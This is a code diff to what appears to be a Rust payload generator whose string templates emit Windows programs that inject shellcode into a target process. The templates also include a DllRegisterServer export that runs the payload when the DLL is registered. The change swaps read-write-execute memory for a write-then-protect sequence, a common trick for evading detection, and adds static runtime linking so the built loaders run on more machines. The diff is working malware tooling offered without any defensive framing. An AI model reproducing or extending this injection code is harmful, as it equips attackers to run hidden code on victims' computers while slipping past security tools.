@@ -124,14 +124,17 @@ fn main() -> Result<(), String>{{
     
         unsafe fn inject_shellcode(target_process_handle: HANDLE, mut shellcode: Vec<u8>) -> usize{{
     
-        let base_address: usize = 0;
-        let base_address = memory::allocate_virtual_memory(target_process_handle, base_address, shellcode.len(), 0x40).1;
+            let base_address: usize = 0;
+            let base_address = memory::allocate_virtual_memory(target_process_handle, base_address, shellcode.len(), 0x04).1;
+        
+        
+            let mut bytes_written = 0;
+            memory::write_virtual_memory(target_process_handle, base_address, shellcode.as_mut_ptr() as *mut c_void, shellcode.len(), &mut bytes_written);
     
-    
-        let mut bytes_written = 0;
-        memory::write_virtual_memory(target_process_handle, base_address, shellcode.as_mut_ptr() as *mut c_void, shellcode.len(), &mut bytes_written);
-    
-        base_address
+            let mut old_protect = 0 as u32;
+            memory::protect_virtual_memory(target_process_handle, base_address, shellcode.len(), 0x20, &mut old_protect);
+        
+            base_address
         
         }}
 "#, pid, dll, export)
@@ -204,7 +207,7 @@ clap = {{ version = "4.3.5", features = ["derive"] }}
 memory = {{ path = "../memory" }}
 remote_modules = {{ path = "../remote_modules" }}
 sysinfo = "0.29.10"
-
+static_vcruntime = "2.0"
 
 [dependencies.windows]
 version = "0.48"
@@ -223,6 +226,9 @@ features = [
 "Win32_System_Console",
 "Win32_UI_WindowsAndMessaging"
 ]
+
+[build-dependencies]
+static_vcruntime = "2.0"
     "#)
 }
 
@@ -240,4 +246,12 @@ pub extern "C" fn DllRegisterServer() {{
     main();
 }}
 "#)
+}
+
+pub fn vcruntime() -> String{
+    format!(r#"
+fn main() {{
+    static_vcruntime::metabuild();
+}}
+    "#)
 }
